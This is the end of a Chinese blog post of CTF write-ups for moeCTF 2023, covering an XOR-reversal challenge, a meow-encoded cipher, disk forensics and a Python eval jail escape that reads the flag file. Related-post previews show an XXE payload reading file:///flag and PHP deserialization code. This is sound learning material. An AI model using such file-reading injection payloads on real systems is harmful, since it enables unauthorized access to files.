+<p><img src="https://s2.loli.net/2024/03/08/7VWfacCL9tn5ARl.png"></p>
+<p>解读代码，要求 enc[]&#x3D;input[]异或 0x39，而 input 就是 flag 的内容</p>
+<p>双击 enc 找到其位置</p>
+<p><img src="https://s2.loli.net/2024/03/08/rFw3hk7IfcEeS2U.png"></p>
+<p>shift+e 提取出来</p>
+<p><img src="https://s2.loli.net/2024/03/08/WVkMETg5qUaAv2N.png"></p>
+<p>这是 enc[]数组里的值，我们只需要把原代码逆过来求用户应该输入的 flag 值即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0x4D</span>, <span class="number">0x5F</span>, <span class="number">0x42</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x66</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x61</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x6B</span>, <span class="number">0x18</span>, <span class="number">0x44</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">28</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i) &#123;</span><br><span class="line">        input[i] = (enc[i] ^ <span class="number">0x39</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X&quot;</span>, input[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">27</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/08/a4q2u1QegcL5dfE.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/mo6KqEuWaAZyXMN.png"></p>
+<p><strong>moectf{You_kn0w_h0w_t0_X0R!}</strong></p>
+<h3 id="喵言喵语"><a href="#喵言喵语" class="headerlink" title="喵言喵语"></a>喵言喵语</h3><p>摩斯密码</p>
+<p><img src="https://s2.loli.net/2024/03/08/mSLWVApziKXjn2Z.png"></p>
+<p><strong>喵喵？作为-<br>喵喵喵为.</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/WMEHSqIQfGF6Anz.png"></p>
+<p><strong>moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}</strong></p>
+<h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>取证</p>
+<p>下载附件</p>
+<p><img src="https://s2.loli.net/2024/03/08/5wpbltBdJykv9EC.png"></p>
+<p><strong>左下添加一个硬盘，选择附件文件，别的操作不动即可</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/N1DV2Rv7zFb6fgo.png"></p>
+<p><strong>开机后发现两个盘，一个加密一个未加密，从未加密的盘里找到 key 再去解密加密盘即可</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/NUTCXM8tokguyE2.png"></p>
+<p>$RECYCLE.BIN&#x2F;S-1-5-21-3152099865-1651255762-3118541945-500&#x2F;$RMJ65VN.TXT</p>
+<p>此处找到密码</p>
+<p><img src="https://s2.loli.net/2024/03/08/Ee1gP6ywsWAUMxJ.png"></p>
+<p>把密码给到第一个盘解密后打开</p>
+<p><img src="https://s2.loli.net/2024/03/08/ve5QH9dltNAfm76.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/DLMuUqgXEVcNobk.png"></p>
+<p>base64 解密</p>
+<p><img src="https://s2.loli.net/2024/03/08/JHN8jhp3To5gD6X.png"></p>
+<p><strong>moectf{Bas1c_D15k_F0r3ns1cs!}</strong></p>
+<h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><p>   python 知识</p>
+<p>题目：eval(用户输入)</p>
+<p>这里尝试直接读取 flag</p>
+<p><img src="https://s2.loli.net/2024/03/08/ojNYIhl7KwmLWXy.png"></p>
+<p>和今年国赛初赛的签到题一样的，只不过 flag 不在根目录就在当前目录</p>
+<p><img src="https://s2.loli.net/2024/03/08/cBWumawOLH2jTrn.png"></p>
+<p><strong>print(open(‘flag’).read())</strong></p>
+<p><strong>flag{dR6GEZKWSwldDRfgEiPr-_moppEM_U20}</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Nanian233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/03/08/moeCTF%202023%20wp/">http://example.com/2024/03/08/moeCTF%202023%20wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Nanian233🍊's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/MISC/">MISC</a><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post-share"><div class="social-share" data-image="https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/03/06/FSCTF%202023%20wp/" title="FSCTF 2023"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/03/19/e088f040cc4a42d2866bf23364767098.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="info-item-2">FSCTF 2023</div></div><div class="info-2"><div class="info-item-1">MISCSimple Encryption伪加密 01 02 后面的 09 00 改为 00 00 即可 萧河补 png 头 89 50 4E 47 base 套1234567891011121314151617181920import base64def recursive_base64_decode(data):    decoded_data = base64.b64decode(data.encode()).decode(&#x27;utf-8&#x27;, &#x27;ignore&#x27;)    # 寻找特定字词，例如 &#x27;是&#x27;    keyword = &#x27;是&#x27;    if keyword in decoded_data:        index = decoded_data.index(keyword)        decoded_data = decoded_data[index + len(keyword):]    if &#x27;&#125;&#x27; in decoded_data:        retu...</div></div></div></a><a class="pagination-related" href="/2024/03/07/Hacker%20game%202023%20wp/" title="中国科学技术大学第十届信息安全大赛"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/03/19/773dfeee96fd40ba946f0b7f62454522.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="info-item-2">中国科学技术大学第十届信息安全大赛</div></div><div class="info-2"><div class="info-item-1">Hackergame 启动点一下提交看到 url 处多了参数 这个是测试你的音频准度的，直接给值 100 就行  更深更暗F12 搜索 flag 即可  赛博井字棋题目考查和 ai 下棋，下赢得 flag 先下一步棋后 bp 抓包 x&#x3D;0  拿回显给的 session 继续下棋就行了，不用管 ai 下哪 x&#x3D;1  x&#x3D;2 练成一条线就 win  组委会模拟器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import timefrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.support.ui import WebDriverWaitfrom...</div></div></div></a><a class="pagination-related" href="/2024/08/21/BaseCTF%202024/" title="BaseCTF 2024"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/07/25/_202407252316151.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="info-item-2">BaseCTF 2024</div></div><div class="info-2"><div class="info-item-1">MISC[Week1] Base解密base64即可 [Week1] 捂住X只耳音频分离成左右声道后,将其中一个声道反相,然后再次合并两个声道,听到摩斯密码FOLLOW YOUR HEART 套上flag头即可 [Week1] 你也喜欢圣物吗lsb最低位拿到key解开zip后又有一个伪加密的,改09为00即可,txt底部解base64得到flag [Week1] 人生苦短，我用Python考查对python数组的熟悉,得到的py是可以运行的,一步一步检查即可1.	总长38字符2.	开头为BaseCTF{3.	Mp在第11,12位(flag.find(‘Mp’) !&#x3D; 10指的是M应该在flag[10]也就是第11位)4.	末尾为3x}5.	末尾为}6.	总共有4个_7.	以下划线为分割字符长度为:14_2_6_4_88.	12-32(不包括32),每隔4个取一个为lsT_n(12 16 20 24 28)9.	以emoji猫为分割的前9位为BASECTF{S(此时s还不确定大小写)10.	flag[-11]的5次方是1024(倒数第11位为4)11.	flag[-7:-...</div></div></div></a><a class="pagination-related" href="/2024/03/08/HgameCTF%202024%20wp/" title="HgameCTF 2024"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/03/19/_20240308214158.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-08</div><div class="info-item-2">HgameCTF 2024</div></div><div class="info-2"><div class="info-item-1">MISCSignInPS ctrl+T 出现调整框按住 shift 然后上下拉窄，左右拉宽  hgame{WOW_GREAT_YOU_SEE_IT_WONDERFUL} simple_attack明文攻击把给的图片用 bandizip 压缩成 zip 文件后作为明文文件在 ARCHPR 中解密  解密后打开 txt 文件  https://www.cnblogs.com/ECJTUACM-873284962/p/9245474.html 得到的字符串直接放在 url 处就可以得到 flag 图片了  hgame{s1mple_attack_for_zip} 希儿希儿希尔 不用修复图片 直接拉到 010 底部看到密文  结合题目标题可知是希尔解密 密钥使用 zsteg 查信道得到  密钥是 8 7 3 8 http://www.metools.info/code/hillcipher243.html  得到 flaghgame{DISAPPEARINTHESEAOFBUTTERFLY} 来自星尘的问候 stegseek 把题目的 png 跑了下 密码是 123456，解得新的一张 ...</div></div></div></a><a class="pagination-related" href="/2024/06/05/LitCTF2024%20wp/" title="LitCTF 2024"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/06/05/efa4c9e15a.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-05</div><div class="info-item-2">LitCTF 2024</div></div><div class="info-2"><div class="info-item-1">WEBexx无过滤 xml 注入 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY rabbit SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;   SAS - Serializing Authentication入门级反序列化 123456789101112131415161718192021&lt;?phpclass User &#123;    public $username;    public $password;    function __construct($username, $password) &#123;        $this-&gt;username = $u...</div></div></div></a><a class="pagination-related" href="/2024/03/07/ISCTF%202023%20wp/" title="ISCTF 2023"><img class="cover" src="https://tuchuang.voooe.cn/images/2024/03/19/7c125e71d6bd478aa288abe3ac25672e.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="info-item-2">ISCTF 2023</div></div><div class="info-2"><div class="info-item-1">web圣杯战争!!!php 反序列化 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__FILE__);error_reporting(0);class artifact&#123;    public $excalibuer;    public $arrow;    public function __toString()&#123;        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;        return $this-&gt;excalibuer-&gt;arrow;    &#125;&#125;class prepare&#123;    public $release;    public function __get($key)&#123;        $functioin = $this-&gt;release;        echo &quot;蓄力!咖喱棒...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Nanian233</div><div class="author-info-description">热爱,就坚持下去!💪🏻</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/nanian-233" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1661926098" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://space.bilibili.com/142512280" target="_blank" title="B站"><i class="fab fa-bilibili"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-number">1.1.</span> <span class="toc-text">http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">1.2.</span> <span class="toc-text">web 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84-flag"><span class="toc-number">1.3.</span> <span class="toc-text">彼岸的 flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-number">1.4.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gas-gas-gas"><span class="toc-number">1.5.</span> <span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moe-%E5%9B%BE%E5%BA%8A"><span class="toc-number">1.6.</span> <span class="toc-text">moe 图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-number">1.7.</span> <span class="toc-text">了解你的座驾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-number">1.8.</span> <span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meo-%E5%9B%BE%E5%BA%8A"><span class="toc-number">1.9.</span> <span class="toc-text">meo 图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="toc-number">1.10.</span> <span class="toc-text">夺命十三枪</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">2.1.</span> <span class="toc-text">misc 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%87-1"><span class="toc-number">2.2.</span> <span class="toc-text">打不开的图片 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%87-2"><span class="toc-number">2.3.</span> <span class="toc-text">打不开的图片 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-1-%E6%99%AE%E9%80%9A%E7%9A%84%E7%8C%AB"><span class="toc-number">2.4.</span> <span class="toc-text">狗子(1) 普通的猫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#building-near-lake"><span class="toc-number">2.5.</span> <span class="toc-text">building_near_lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8A%E5%98%9F%E5%81%87%E5%98%9F%EF%BC%9F"><span class="toc-number">2.6.</span> <span class="toc-text">尊嘟假嘟？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AB%E7%83%AB%E7%83%AB"><span class="toc-number">2.7.</span> <span class="toc-text">烫烫烫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-2-%E7%85%A7%E7%89%87"><span class="toc-number">2.8.</span> <span class="toc-text">狗子(2) 照片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base-%E4%B9%90%E9%98%9F"><span class="toc-number">2.9.</span> <span class="toc-text">base 乐队</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">2.10.</span> <span class="toc-text">奇怪的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E4%BD%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.11.</span> <span class="toc-text">机位查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-3-%E5%AF%9D%E5%AE%A4"><span class="toc-number">2.12.</span> <span class="toc-text">狗子(3) 寝室</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%83%B3%E8%A6%81-flag-%E5%90%97"><span class="toc-number">2.13.</span> <span class="toc-text">你想要 flag 吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%85%A7%E7%89%87%E5%86%B2%E6%B4%97"><span class="toc-number">2.14.</span> <span class="toc-text">照片冲洗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-4-%E6%95%85%E4%B9%A1%E8%AF%9D"><span class="toc-number">2.15.</span> <span class="toc-text">狗子(4) 故乡话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weird-package"><span class="toc-number">2.16.</span> <span class="toc-text">weird_package</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">3.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base-64"><span class="toc-number">3.1.</span> <span class="toc-text">base_64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ccccc"><span class="toc-number">3.2.</span> <span class="toc-text">ccccc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">3.3.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runme"><span class="toc-number">3.4.</span> <span class="toc-text">runme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runme2"><span class="toc-number">3.5.</span> <span class="toc-text">runme2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">3.6.</span> <span class="toc-text">crypto 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrot"><span class="toc-number">3.7.</span> <span class="toc-text">ezrot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%8F%AF%E7%9A%84%E6%96%B0%E5%9B%B4%E5%A2%99"><span class="toc-number">3.8.</span> <span class="toc-text">可可的新围墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9A%87%E5%B8%9D%E7%9A%84%E6%96%B0%E5%AF%86%E7%A0%81"><span class="toc-number">3.9.</span> <span class="toc-text">皇帝的新密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E2%80%9D%E7%9A%87%E5%B8%9D%E7%9A%84%E6%96%B0%E5%AF%86%E7%A0%81%E2%80%9D"><span class="toc-number">3.10.</span> <span class="toc-text">不是”皇帝的新密码”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">3.11.</span> <span class="toc-text">Reverse 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#test-nc"><span class="toc-number">3.12.</span> <span class="toc-text">test_nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ai-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">3.13.</span> <span class="toc-text">ai 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xor"><span class="toc-number">3.14.</span> <span class="toc-text">Xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%96%B5%E8%A8%80%E5%96%B5%E8%AF%AD"><span class="toc-number">3.15.</span> <span class="toc-text">喵言喵语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E8%BA%AB%E6%90%BA%E5%B8%A6%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">3.16.</span> <span class="toc-text">随身携带的虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-0"><span class="toc-number">3.17.</span> <span class="toc-text">Jail Level 0</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2024 - 2025 By Nanian233</span></div><div class="footer_custom_text">Once you do something, you never forget. Even if you can't remember.<p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank"href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
